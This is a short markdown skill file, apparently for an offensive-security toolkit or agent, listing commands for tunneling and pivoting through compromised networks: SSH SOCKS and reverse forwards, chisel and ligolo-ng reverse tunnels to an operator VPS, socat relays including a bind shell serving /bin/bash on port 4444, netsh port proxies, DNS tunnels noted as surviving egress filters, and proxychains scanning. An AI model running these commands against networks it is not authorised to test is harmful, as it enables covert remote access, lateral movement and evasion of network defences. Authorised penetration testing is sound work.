---
name: pivot
description: Tunneling and pivoting — ssh, chisel, ligolo, socat, proxychains, DNS.
tags: [pivot, tunnel, proxy, socks]
---
# Pivot

## SSH
- SOCKS: `ssh -D 1080 -N -f user@$JUMP` → `proxychains4 nmap -sT -Pn $INTERNAL`.
- Local forward: `ssh -L 8080:127.0.0.1:80 user@$JUMP`.
- Remote forward (expose yourself): `ssh -R 9001:127.0.0.1:9001 user@$VPS`.
- Jump chain: `ssh -J a,b c`; `ProxyJump` in `~/.ssh/config`.

## Chisel (single binary, TLS)
- Server: `chisel server -p 8080 --reverse --socks5`.
- Client: `chisel client https://$VPS:8080 R:socks` → SOCKS5 on 1080.
- Port forward: `chisel client $VPS:8080 8081:127.0.0.1:80`.

## Ligolo-ng (TUN, fast)
- Proxy: `ligolo-proxy -selfcert -laddr 0.0.0.0:11601`
- Agent: `ligolo-agent -connect $VPS:11601 -ignore-cert`
- `session`, `ifconfig`, `start` → `ip route add 10.10.10.0/24 dev ligolo`.

## socat / netsh
- `socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80`
- `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr`
- Windows: `netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.5 connectport=80`.

## DNS
- `dnscat2-server domain` + client; slow but survives egress filters.
- `iodine` for IP-over-DNS when only 53 is open.

## Proxychains
- `socks5 127.0.0.1 1080` + `proxy_dns` in `/etc/proxychains4.conf`.
- `proxychains4 -q nmap -sT -Pn -n $IP` (no SYN scan through SOCKS).
- Native proxy: `curl --socks5-hostname`, `ffuf -x socks5://127.0.0.1:1080`.

## Hidden knowledge
- `ssh -D` binds localhost; use `-D 0.0.0.0:1080` for other tools/containers.
- Check egress: 80/443/53 usually open, 8080/8443 sometimes, ICMP often blocked.
- Double pivot: chain SOCKS through chisel then proxychains; latency compounds — raise timeouts.
- `nmap -sT` is required through SOCKS; `-sS` silently fails.
- Keep a `pivot.md` note of routes; you will forget which port maps where.
